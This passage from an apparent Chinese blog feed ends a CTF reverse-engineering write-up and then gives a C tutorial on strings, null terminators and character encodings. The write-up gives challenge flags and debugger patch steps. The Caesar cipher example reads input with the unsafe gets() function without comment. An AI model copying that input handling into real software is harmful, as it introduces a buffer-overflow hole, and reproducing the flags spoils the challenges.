class="keyword">if</span> (enc[idx] == <span class="number">255</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> (enc[idx] == <span class="number">1</span>)</span><br><span class="line">            c++;</span><br><span class="line">        <span class="keyword">if</span> (enc[idx] == <span class="number">0</span>) &#123;</span><br><span class="line">            flag[idx_flag++] = c;</span><br><span class="line">            c = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        idx++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> key[] = <span class="string">&quot;SCNU&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; idx_flag; ++i)</span><br><span class="line">        <span class="built_in">putchar</span>(flag[i] ^ key[i % <span class="number">4</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>flag&#123;Winn3r_n0t_L0s3r_#&#125;</code></p><p>结束…</p><h1 id="toddler-regs">toddler_regs</h1><p>这个题我当时最后一个点莫名其妙跑出来的…</p><p>动调修改,第一步运行到stage_1()的调用处,patch汇编,把32改成23:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231013153754275.png" alt="image-20231013153754275"></p><p>然后同样在调用j_stage_2_fake()时将call指令patch为<code>call j_stage_2_real</code>:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231013154357033.png" alt="image-20231013154357033" style="zoom:40%;" /><p>然后继续单步调试,直到提示从指定的地址读取flag,我们按g快捷键跳转过去提取出来即可:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231013154450248.png" alt="image-20231013154450248" style="zoom:50%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231013154512103.png" alt="image-20231013154512103" style="zoom:50%;" /><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> flag[] =</span><br><span class="line">            &#123;</span><br><span class="line">                    <span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">123</span>, <span class="number">88</span>, <span class="number">112</span>, <span class="number">48</span>, <span class="number">105</span>, <span class="number">110</span>,</span><br><span class="line">                    <span class="number">116</span>, <span class="number">95</span>, <span class="number">49</span>, <span class="number">115</span>, <span class="number">95</span>, <span class="number">110</span>, <span class="number">49</span>, <span class="number">99</span>, <span class="number">51</span>, <span class="number">95</span>,</span><br><span class="line">                    <span class="number">98</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">95</span>, <span class="number">88</span>, <span class="number">112</span>, <span class="number">48</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>,</span><br><span class="line">                    <span class="number">74</span>, <span class="number">78</span>, <span class="number">85</span>, <span class="number">95</span>, <span class="number">105</span>, <span class="number">115</span>, <span class="number">95</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">49</span>,</span><br><span class="line">                    <span class="number">114</span>, <span class="number">100</span>, <span class="number">125</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">            &#125;;</span><br><span class="line">    <span class="built_in">puts</span>(flag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flag{Xp0int_1s_n1c3_but_Xp0intJNU_is_we1rd}</p><p>结束…</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-11-字符串</title>
      <link href="/2023b45ef26d6ec3/"/>
      <url>/2023b45ef26d6ec3/</url>
      
        <content type="html"><![CDATA[<p>提要:</p><p>本章要讲解<code>字符串</code>的内容.同时会使用到前面<code>基本输入输出</code>一章中讲解的各种<code>输入输出函数</code>和<code>数组</code>,若不了解请自行复习.</p><p>注意:</p><p>本章需要的前置知识为:</p><p>1.彻底掌握C语言单个字符(字符变量)的相关知识,如果没有掌握,请回看前面的<code>数据类型</code>一章!</p><p>2.掌握<code>一维数组</code>的相关知识,如果没有掌握,请回看前面的<code>数组</code>一章!</p><h1 id="什么是字符串">什么是字符串</h1><p>一个程序需要的不仅仅是针对问题进行计算,还需要和用户(程序的执行者)进行交互,例如在界面(控制台等)打印一个标题来显示程序名/打印一行提示等,这些信息往往都是一个个的字符,比如这一句话<code>&quot;This is a calculator&quot;</code>,就是一个由字母,空格这样一个个的字符组成的<code>序列</code>,我们称之为<code>字符串</code>.</p><p>字符串的用途很多,最显而易见的就是作为<code>和用户交互的信息</code>进行输出.</p><p>此外,字符串也可以作为程序运算的对象,例如一个用于实现凯撒密码的程序,就要对密文字符串进行加密:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">caesar</span><span class="params">(<span class="type">char</span> before_c, <span class="type">int</span> offset)</span> &#123;</span><br><span class="line">    <span class="type">int</span> c = before_c;</span><br><span class="line">    <span class="keyword">while</span> (offset &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        offset += <span class="number">26</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">islower</span>(c)) &#123;</span><br><span class="line">        c = c + offset;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;a&#x27;</span> + (c - <span class="string">&#x27;a&#x27;</span>) % <span class="number">26</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">isupper</span>(c)) &#123;</span><br><span class="line">        c = c + offset;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;A&#x27;</span> + (c - <span class="string">&#x27;A&#x27;</span>) % <span class="number">26</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">100</span>];</span><br><span class="line">    <span class="type">int</span> offset;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;输入明文字符串: &quot;</span>); <span class="comment">// 提示用户输入一行字符串作为明文</span></span><br><span class="line">    gets(str);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入偏移量: &quot;</span>); <span class="comment">// 提示用户输入一个整数作为偏移量</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;偏移后的密文为: &quot;</span>); <span class="comment">// 提示用户接下来输出的一行字符串即为加密后的密文</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(str); ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">isalpha</span>(str[i]))</span><br><span class="line">            <span class="built_in">putchar</span>(caesar(str[i], offset)); <span class="comment">// 使用putchar()进行输出</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">putchar</span>(str[i]); <span class="comment">// 使用putchar()进行输出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231026012133913.png" alt="image-20231026012133913" style="zoom:50%;" /><p>上面这个程序就使用gets()函数输入了一个字符串(可以包含空格),然后将字符串中的字母按照输入的偏移量(可以自行百度<code>凯撒密码</code>)进行变换加密.</p><p>任何高级编程语言都有针对字符串的功能支持,我们将对C语言的实现进行详细讲解.</p><h1 id="c风格的字符串">C风格的字符串</h1><p>首先必须提出的一点是,抛开平时简单的代码不谈,实际情况下,几乎所有的关于字符串的处理都不是什么易事.</p><p>这里说的处理不单单是对字符串进行替换,连接,删除等操作,更复杂的是面对用户时如何的正确处理输入输出.</p><p>初学者可能会在scanf,printf这两个函数上耗费大量的时间,不要紧,这两个函数没有那么难.</p><p>这一段内容的前置知识要求彻底掌握C语言单个字符的相关知识,如果没有掌握,请回看前面的<code>数据类型</code>一章!</p><h2 id="字符串常量">字符串常量</h2><p>如果我们仅仅是想要一个不变的字符串,可以使用字符串常量.</p><p>C语言中,字符串是由一对<code>&quot;&quot;</code>和其包括起来的任意数量的字符组成.</p><p>例如,我们想要表示<code>Hello world!</code>这行字符串,就是这么写:</p><p><code>&quot;Hello world!&quot;</code></p><p>任何可以放到char变量中的字符,都可以出现在字符串中,需要注意的是:</p><p><code>转义字符</code>依旧需要在字符串中转义,它和单个字符相同,只不过是和其他字符紧挨着放在一起了而已:</p><p><code>&quot;hello\nwelcome!&quot;</code>这个字符串中的换行符<code>'\n'</code>尽管和其他字符连在一起,但是不影响C语言识别出它.</p><h2 id="printf的第一个参数">printf的第一个参数</h2><p>前面讲过,使用<code>printf()</code>函数,我们可以直接输出一个字符串常量:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello user1\n&quot;</span>); <span class="comment">// 现在我们知道,&quot;Hello user1\n&quot;就是一个字符串了</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在之前,我们仅仅知道使用printf时,括号里第一个部分需要加上双引号,现在我们知道了,它是一个字符串.</p><p>前面所说的这是一个&quot;格式化字符串&quot;,代表的是这个字符串的功能,其中形如<code>%d</code>,<code>%s</code>,<code>%lf</code>这样的字符组合并不是<code>转义字符</code>,而仅仅是在printf内部用于识别处理后面参数.</p><h2 id="字符串的长度和占用空间">字符串的长度和占用空间</h2><p>假设我们有如下字符串:</p><p><code>&quot;hello world!\n&quot;</code></p><p>1.那么这个字符串的长度是多少?</p><p>显然,可见字符有13个: 10个字母+1个标点+2个空白字符(中间的空格和末尾的换行)</p><p>所以这个字符串的长度为13.</p><p>2.那么存储这个字符串需要多少空间呢?(以字节为单位)</p><p>实际上,一个字符占用一个字节,那么13个字符就占用13个字节,但是问题并没有那么简单,事实上,我们需要14个字节去存储它.</p><p>因为一个字符串必须要有一个结束标志,来代表这个字符串到达结尾.那么C语言中,这个标志就是所谓的零字符<code>'\0'</code>,注意和<code>'0'</code>区分!<code>'\0'</code>实际上就是一个0(只不过是一个字节),所以有时候我们也可以使用0来简写.</p><p>可以这样理解:为了取消特殊性,<code>'\0'</code>仍然是一个字符,这是一个转义字符,为了和字符<code>'0'</code>区别.</p><p>它同样占用一个字节,所以整个字符串需要14个字节去存储!</p><p>后面我们会讨论字符串的访问溢出问题.</p><h2 id="字符串常量的使用问题">字符串常量的使用问题</h2><p>1.能否拼接?</p><p>字符串<code>&quot;Hello user1\n&quot;</code>由如下若干个字符连接而成:</p><p><code>'H','e','l','l','o',' ','u','s','e','r','1','\n'</code></p><p>但是遗憾的是,我们并不能将其使用<code>+运算符</code>进行拼接—读者可能使用过其他的一些语言,例如python,JavaScript,它们是可以使用<code>+运算符</code>拼接字符串的,因为他们将<code>字符串</code>视为一个<code>对象</code>!然而C语言作为一门面向过程的语言,自然是对此没有支持.</p><p>2.可以用单引号?</p><p>更为错误的是,我们必须使用<code>&quot;&quot;</code>,而不是<code>''</code>来包括一个字符串,字符和字符串是不一样的—字符属于基本类型,而C语言没有任何基本类型来直接存储字符串!</p><p>3.不是对象,那它是什么?</p><p>这里可能有点&quot;超纲&quot;,但是有必要指出,C语言中的字符串常量的<code>类型</code>是一个字符指针(指向的空间内容为const),这个字符指针的值为字符串中第一个字符的存储地址!</p><p>例如<code>&quot;hello world&quot;</code>,我们对其进行使用的时候,实际上我们仅仅是获取到了这个字符串常量的指针(地址)而已,也就是<code>'h'</code>的存储地址,常量字符串存储在常量区,我们不能对其进行修改.</p><p>同样很无奈,想要深入探索这个问题,必须等到后面讲解到指针才行.</p><p>4.字符串怎么修改?</p><p>第3点中指出,字符串常量是无法被修改的,因为其类型为<code>const char*</code>,更根本的原因是它存储在内存的常量区,修改它的结果是不确定的,甚至会导致程序直接崩溃.</p><p>那么如何使用可修改的字符串呢,下面来讲解.</p><h2 id="可修改的字符串">可修改的字符串</h2><p>尽管字符串很重要,但是很遗憾的是,C语言并没有任何专门存储字符串的数据类型,因为C太过底层.</p><p>我们分析一下字符串的结构就可以看出,实际上每一个字符都单独地占用一个字节(暂时仅仅考虑英文字符集),并且这些字符都是连续排列的,直到遇到一个<code>'\0'</code>结束,也就是末尾一个字节是全0.</p><p>那么我们很容易想到,我们可以利用C语言的数组来进行存储一个字符串,仅需要将数组的元素类型设置为char即可:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">15</span>] = <span class="string">&quot;Hello world!&quot;</span>; <span class="comment">// 不知道为什么可以这样初始化的请回顾前面数组的知识</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, str); <span class="comment">// %s代表接受一个字符指针,这个字符指针指向一个字符串</span></span><br><span class="line">    <span class="comment">// 这里直接写字符数组的数组名即可,同样,详细原因--&gt;见指针</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里使用一个存储char类型元素的数组来存储这个字符串,C语言提供了一种方便的写法,可以使用一个字符串常量对其进行初始化,这样,我们就得到了这个字符串常量的一个副本,将其存储在str数组中.</p><p>我们当然也可以这样写:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> str[<span class="number">15</span>] = &#123;</span><br><span class="line">            <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;\0&#x27;</span></span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure><p>显然这种方法不如第一种方便,最后面的<code>'\0'</code>可省略,但是不建议,显式加上字符串结束符是一个好习惯.</p><p>同样,尽管我们这样使用数组来存储一个字符串,但是他还是一个数组,这意味着我们可以使用一切数组的用法来对其进行操作,例如我们可以使用下标的方式获取到某一个字符,并且对其进行修改,十分简单,读者请自行尝试.</p><h1 id="重点-数组的问题">重点:数组的问题</h1><h2 id="数组的大小和溢出">数组的大小和溢出</h2><p>一定要注意的是,字符串后面会有一个<code>'\0'</code>结束符,它必须纳入数组长度的考虑,例如,我们至少需要:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> str[<span class="number">14</span>] = <span class="string">&quot;hello world!\n&quot;</span>;</span><br></pre></td></tr></table></figure><p>我们如果使用<code>printf(&quot;%s&quot;, str);</code>对其进行输出,结果是这样的:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231028020751640.png" alt="image-20231028020751640" style="zoom:50%;" /><p>没有问题,最后会有一个换行.但是,如果我们仅仅考虑了字符串的长度13,结果就会变得十分意外:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> str[<span class="number">13</span>] = <span class="string">&quot;hello world!\n&quot;</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, str);</span><br></pre></td></tr></table></figure><p>运行结果是这样的:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231028020918221.png" alt="image-20231028020918221" style="zoom:50%;" /><p>可以发现,在正常输出了原来的字符后,末尾又输出了一些奇怪的字符,这意味着在访问数组时,并没有访问到<code>'\0'</code>—由于数组长度太短,没能够存储进去,这就导致字符数组中仅仅保存了前面的字符,而没有正确的结束标志.</p><p>这样的后果就是,当字符串在输出时,会一直向后访问,直到在相邻的内存中遇到一个全0的字节!</p><p>进一步,如果我们多次运行这个程序呢?结果会是一样的吗?</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231028021234520.png" alt="image-20231028021234520" style="zoom:50%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231028021244512.png" alt="image-20231028021244512" style="zoom:50%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231028021256848.png" alt="image-20231028021256848" style="zoom:50%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231028021306320.png" alt="image-20231028021306320" style="zoom:50%;" /><p>可以发现,后面输出的乱码完全是随机的,事实上,这个程序:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">13</span>] = <span class="string">&quot;hello world!\n&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们对其进行输出,已经发生了<code>栈溢出</code>,非要深究的话,我们前面输出的那些乱码全部都是程序运行时栈的内容,由于str是局部变量,所以它在main函数的栈中分配,我们访问到数组末尾,并没有发现结束符,printf就会错误地认为字符串并没有结束,进而继续向后访问(实际上是继续<code>向下</code>访问更高地址的数据,因为堆栈是从高地址向低地址增长)</p><p>每次程序运行,调用栈的相关数据都是不一样的,因为操作系统(这里是Windows)每次运行这个程序,都会为其分配不同位置的内存,这就导致每次错误访问到的数据不同.</p><p>总之,在使用字符数组来保存字符串的时候,千万要注意数组的长度,确保至少能刚好存下这个字符串.</p><p>然而,我们知道声明数组时,有时可以省略长度,只要我们对其进行了初始化,这意味着我们可以让编译器自动计算长度:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> str[] = <span class="string">&quot;hello world!\n&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231028022323391.png" alt="image-20231028022323391" style="zoom:50%;" /><p>这样没有任何问题,如不理解请复习<code>数组</code>.</p><h2 id="再探ascii码-char和中文">再探ASCII码-char和中文</h2><h3 id="char的符号">char的符号</h3><p>前面讲解过,char变量存储的实际上是一个字符的ASCII码,其值范围是0~127.</p><p>但是char是一个字节,意味着有8位,如果按照无符号去存,范围是0~255,显然多了一倍.相反地,如果按照有符号去存,其值范围为-128~127.同样的8个二进制位以不同的解释方式去处理,结果是不同的.</p><p>显然,上面这两种情况分别对应的<code>unsigned char</code>和<code>signed char</code>,这两种类型和<code>char</code>类型并不相同,它们互相独立.也许我解释的不够明确,<code>标准</code>如此说:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231028144837886.png" alt="image-20231028144837886"></p><p>重点是第3点.它指出,标准并未规定<code>char</code>必须和这两种解释方式(有符号和无符号)中的某一种等价.标准将这个问题交给具体的实现(C编译器的编写者)来处理,不同的实现可能不同,但是大多数情况下,<code>char</code>往往是有符号的,也就是说它和<code>signed char</code>等价.</p><p>从现在开始,本教程默认<code>char</code>类型和<code>signed char</code>等价,亦即认为char有符号.</p><h3 id="溢出问题">溢出问题</h3><p>尽管char类型一般被解释为有符号的,但是不影响其8位仍然有256种状态,我们其实将负数全部舍弃不用,仅仅使用正数部分即可表示所有的ASCII码.</p><p>但是,这又牵扯出一个溢出问题—尽管我们原则上不使用负数,但是仍然有可能无意或有意地把一个char变量变成负数.</p><br><p>例如,字符’A’对应ASCII码65,我们对其加32,让其变成97,也就是’a’,这就实现了大小写转换.</p><p>但是,如果我们&quot;意外地&quot;(有意地)对其加了100,那么实际上结果并不是165,而是-91.</p><p>这里发生了一个<code>上溢</code>,由于计算机中整数加法实际上是补码加法,存在正溢出和负溢出,简单的说就是当数值超出了能够表示的上界和下界,就会从下界和上界进行回绕,溢出了多少就绕回多少.</p><p><code>165</code>比char的<code>上界127</code>多出了38,则从<code>下界-128</code>回绕38,-128视为已经回绕了1,那么就要从-128再加上37,最后的结果就是<code>-91</code>.</p><p>下溢也是同理,总之,对于正常的英文字符而言,溢出到了负数意味着不是一个合法的字符,对其强行进行解释也只会显示一个乱码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> a = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">    a += <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">putchar</span>(a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果为:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231028151824408.png" alt="image-20231028151824408" style="zoom:50%;" /><h3 id="非英文字符集支持">非英文字符集支持</h3><p>当然,并不是所有的字符全部都是英文的,这时候,ASCII码便不再适用,因为,此时想要正确表示一个字符,可能需要2个字节,甚至3到4个字节才能够保存.</p><p>例如在GBK编码中,一个中文字符需要两个字节才能存储,更为通用的UTF8编码中,则需要3个字节!</p><p>必须提前说明,Windows默认编码为GBK2312,而更加通用的字符集则是UFT8,这两种编码互不兼容,读者如果要在程序中加入中文字符(其他非英文字符同理),一定要注意编码的统一!</p><p>大部分初学者都是使用windows,所以各位的程序中的中文字符一般都是GB2312(或GBK),而许多软件(例如VSCode)内置的运行终端默认的编码都是UTF8,这就往往会导致新手最头疼的乱码问题.</p><p>解决的办法一般有两种思路:</p><ol><li>将终端的编码设置为gbk,与源代码一起全部统一为GBK.</li><li>将源代码转换为UTF8,一起统一为UFT8.</li></ol><p>读者可以自行百度不同软件的解决方案,笔者这里使用了一个不是很好的方法:开启windows的全局UTF8支持,这样就解决了乱码问题,但是新问题就是,许多朋友的代码都是gbk,直接运行就会导致乱码,而且chcp 936也无可奈何,暂时还未解决.</p><p>所以还是建议去将软件的终端改为GBK相对会好一点.</p><p>但是Linux默认UFT8…这就很难受…</p><br><p>另一方面,由于中文字符不能单靠一个字符去存储,C标准定义了<code>wchar_t</code>这些类型来支持宽字符,这里就不介绍了,因为用起来有点麻烦.</p><p>我们对于中文字符,可以直接存入字符串,尽管一个char不能保存一个中文字符,但是2个(甚至是3个)连在一起就可以实现:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">15</span>] = <span class="string">&quot;你好 世界!&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, str); <span class="comment">// 输出这个字符串</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(str); ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, str[i]); <span class="comment">// 遍历数组的每一个字符,以十进制整数输出其ASCII码</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果为:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231028153616753.png" alt="image-20231028153616753"></p><p>可以看出,除了中间的空格和末尾的感叹号外,其他的字符都不是合法的ASCII字符—它们都是各个中文字符的一部分.</p><p>再例如,我们如果这样写代码,是可以输出一个正确的中文字符的:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span 